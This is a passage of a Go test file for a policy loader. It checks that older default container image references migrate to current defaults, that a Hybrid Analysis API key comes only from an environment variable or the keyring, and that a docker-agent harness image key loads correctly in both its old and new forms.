		{"ghcr.io/blaktron/agentry-node-alpine:22-alpine", DefaultNodeRuntime},
		{"node:22-alpine", DefaultNodeRuntime},
		{"ghcr.io/blaktron/agentry-node-alpine:22-alpine@sha256:b6f26b36c8ff49624cfdac716b8ea1138d606df02586a77d364bb5536a634f85",
			"ghcr.io/blaktron/agentry-node-alpine:22-alpine@sha256:b6f26b36c8ff49624cfdac716b8ea1138d606df02586a77d364bb5536a634f85"},
		{"registry.example/node:22", "registry.example/node:22"},
	} {
		path := filepath.Join(t.TempDir(), "policy.yaml")
		text := strings.Replace(defaultFileText, "nodeRuntime: "+DefaultNodeRuntime, "nodeRuntime: "+c.written, 1)
		if text == defaultFileText {
			t.Fatal("the generated text no longer names the default nodeRuntime")
		}
		if err := os.WriteFile(path, []byte(text), 0o644); err != nil {
			t.Fatal(err)
		}
		p, _, err := Load(path)
		if err != nil {
			t.Fatal(err)
		}
		if p.Images.NodeRuntime != c.want {
			t.Errorf("nodeRuntime %q loads as %q, want %q", c.written, p.Images.NodeRuntime, c.want)
		}
	}
	if slices.Contains(formerDefaultNodeRuntimes, DefaultNodeRuntime) {
		t.Fatal("the current default is listed as a former one")
	}
}

// A policy file written by an earlier CLI names the musl Python runtime of
// that day; it loads as today's glibc default, so servers whose dependencies
// publish only manylinux wheels install on machines set up before the move,
// while any other value, the musl mirror pinned by digest included, is kept.
func TestLoadMovesAFormerDefaultPythonRuntime(t *testing.T) {
	for _, c := range []struct{ written, want string }{
		{"ghcr.io/blaktron/agentry-python-alpine:3.12-alpine", DefaultPythonRuntime},
		{"ghcr.io/blaktron/agentry-python-alpine:3.12-alpine@sha256:4c47124a8391cb7a9f571164147d154777cf012a4ece5f86097130d7a4478111",
			"ghcr.io/blaktron/agentry-python-alpine:3.12-alpine@sha256:4c47124a8391cb7a9f571164147d154777cf012a4ece5f86097130d7a4478111"},
		{"registry.example/python:3.12", "registry.example/python:3.12"},
	} {
		path := filepath.Join(t.TempDir(), "policy.yaml")
		text := strings.Replace(defaultFileText, "pythonRuntime: "+DefaultPythonRuntime, "pythonRuntime: "+c.written, 1)
		if text == defaultFileText {
			t.Fatal("the generated text no longer names the default pythonRuntime")
		}
		if err := os.WriteFile(path, []byte(text), 0o644); err != nil {
			t.Fatal(err)
		}
		p, _, err := Load(path)
		if err != nil {
			t.Fatal(err)
		}
		if p.Images.PythonRuntime != c.want {
			t.Errorf("pythonRuntime %q loads as %q, want %q", c.written, p.Images.PythonRuntime, c.want)
		}
	}
	if slices.Contains(formerDefaultPythonRuntimes, DefaultPythonRuntime) {
		t.Fatal("the current default is listed as a former one")
	}
	if strings.Contains(DefaultPythonRuntime, "alpine") {
		t.Fatal("the default Python runtime is musl again: manylinux-only dependencies cannot install on it")
	}
}

// A policy file written by an earlier CLI names that day's goBuilder
// explicitly, the digest-pinned go1.27.1 mirror included; it loads as
// today's default, so a moved builder reaches machines set up before it,
// while any other value is the operator's and is kept.
func TestLoadMovesAFormerDefaultGoBuilder(t *testing.T) {
	for _, c := range []struct{ written, want string }{
		{"golang:1.27-alpine", DefaultGoBuilder},
		{"ghcr.io/blaktron/agentry-golang-alpine:1.27-alpine", DefaultGoBuilder},
		{"ghcr.io/blaktron/agentry-golang-alpine:1.27-alpine@sha256:8a5910f31396cd4d89662f56c68b3ae31d374308270a1c3bd96672ee5ed43414", DefaultGoBuilder},
		{"ghcr.io/blaktron/agentry-golang-alpine:1.27-alpine@sha256:0000000000000000000000000000000000000000000000000000000000000000",
			"ghcr.io/blaktron/agentry-golang-alpine:1.27-alpine@sha256:0000000000000000000000000000000000000000000000000000000000000000"},
		{"registry.example/golang:1.27-alpine", "registry.example/golang:1.27-alpine"},
	} {
		path := filepath.Join(t.TempDir(), "policy.yaml")
		text := strings.Replace(defaultFileText, "goBuilder: "+DefaultGoBuilder, "goBuilder: "+c.written, 1)
		if text == defaultFileText {
			t.Fatal("the generated text no longer names the default goBuilder")
		}
		if err := os.WriteFile(path, []byte(text), 0o644); err != nil {
			t.Fatal(err)
		}
		p, _, err := Load(path)
		if err != nil {
			t.Fatal(err)
		}
		if p.Images.GoBuilder != c.want {
			t.Errorf("goBuilder %q loads as %q, want %q", c.written, p.Images.GoBuilder, c.want)
		}
	}
	if slices.Contains(formerDefaultGoBuilders, DefaultGoBuilder) {
		t.Fatal("the current default is listed as a former one")
	}
}

// The runtimes' language versions name the line their images' tags do, so
// a moved image cannot leave the Drafter checking against the old one.
func TestTheRuntimeVersionsMatchTheirImages(t *testing.T) {
	for _, c := range []struct{ image, version, tag string }{
		{DefaultNodeRuntime, DefaultNodeVersion, strings.SplitN(DefaultNodeVersion, ".", 2)[0] + "-alpine"},
		{DefaultPythonRuntime, DefaultPythonVersion, strings.Join(strings.SplitN(DefaultPythonVersion, ".", 3)[:2], ".") + "-slim-trixie"},
	} {
		if !strings.HasSuffix(c.image, ":"+c.tag) {
			t.Errorf("%s does not run %s (tag %s)", c.image, c.version, c.tag)
		}
	}
}

// TestHybridAnalysisKey: the block names a variable, HYBRID_API_KEY by default,
// the one a sandbox host hands the platform's key in, and a source of env or
// keyring; anything else is refused, as for judge.
func TestHybridAnalysisKey(t *testing.T) {
	p := Default()
	if got := p.HybridAnalysis.KeyEnv(); got != "HYBRID_API_KEY" {
		t.Fatalf("default variable %q", got)
	}
	p.HybridAnalysis = HybridAnalysisKey{APIKeyEnv: "MY_HA_KEY", APIKeySource: "keyring"}
	if err := p.Validate(); err != nil || p.HybridAnalysis.KeyEnv() != "MY_HA_KEY" {
		t.Fatalf("a named variable and the keyring: %v", err)
	}
	for _, bad := range []HybridAnalysisKey{{APIKeyEnv: "not a name"}, {APIKeySource: "file"}} {
		p.HybridAnalysis = bad
		if err := p.Validate(); err == nil || !strings.Contains(err.Error(), "hybridAnalysis.") {
			t.Errorf("%+v: %v", bad, err)
		}
	}
}

// docker-agent's harness image is one entry of images.harnessImages, as every
// other adapter's is. The generated file names it there; a file naming the
// older images.harnessDockerAgent still loads to the same image; naming both
// is allowed only when they agree; and the entry is a published image, so it
// carries no artifact.
func TestTheDockerAgentHarnessIsAHarnessImagesEntry(t *testing.T) {
	load := func(t *testing.T, text string) (*Policy, error) {
		t.Helper()
		path := filepath.Join(t.TempDir(), "policy.yaml")
		if err := os.WriteFile(path, []byte(text), 0o644); err != nil {
			t.Fatal(err)
		}
		p, _, err := Load(path)
		return p, err
	}
	entry := "    docker-agent: { ref: " + DefaultHarnessImage + " }\n"
	if !strings.Contains(defaultFileText, "  harnessImages:\n"+entry) {
		t.Fatal("the generated file does not name docker-agent's image under harnessImages")
	}
	if strings.Contains(defaultFileText, "\n  harnessDockerAgent:") {
		t.Fatal("the generated file still writes the older key")
	}
	p, err := load(t, defaultFileText)
	if err != nil {
		t.Fatalf("the generated file: %v", err)
	}
	if h, ok := p.Images.HarnessImageFor(DockerAgentAdapter); !ok || h.Ref != DefaultHarnessImage {
		t.Fatalf("the generated file's docker-agent harness is %q (%v)", h.Ref, ok)
	}
	if _, ok := p.Images.HarnessImages[DockerAgentAdapter]; ok {
		t.Fatal("Load left docker-agent in harnessImages")
	}

	other := "ghcr.io/example/docker-agent:9@" + testDigest
	older := strings.Replace(defaultFileText, "  harnessImages:\n"+entry, "  harnessDockerAgent: "+other+"\n", 1)
	p, err = load(t, older)
	if err != nil {
		t.Fatalf("a file naming the older key: %v", err)
	}
	if h, _ := p.Images.HarnessImageFor(DockerAgentAdapter); h.Ref != other {
		t.Fatalf("the older key loads as %q, want %q", h.Ref, other)
	}

	both := strings.Replace(defaultFileText, "  harnessImages:\n", "  harnessDockerAgent: "+DefaultHarnessImage+"\n  harnessImages:\n", 1)
	if _, err := load(t, both); err != nil {
		t.Fatalf("both keys naming the same image: %v", err)
	}
	clash := strings.Replace(defaultFileText, "  harnessImages:\n", "  harnessDockerAgent: "+other+"\n  harnessImages:\n", 1)
	if _, err := load(t, clash); err == nil || !strings.Contains(err.Error(), "name different images") {
		t.Fatalf("both keys naming different images: %v", err)
	}
	artifact := strings.Replace(defaultFileText, entry, "    docker-agent: { ref: "+DefaultHarnessImage+", artifact: "+testDigest+" }\n", 1)
	if _, err := load(t, artifact); err == nil || !strings.Contains(err.Error(), "published image") {
		t.Fatalf("an artifact on docker-agent's entry: %v", err)
	}
}
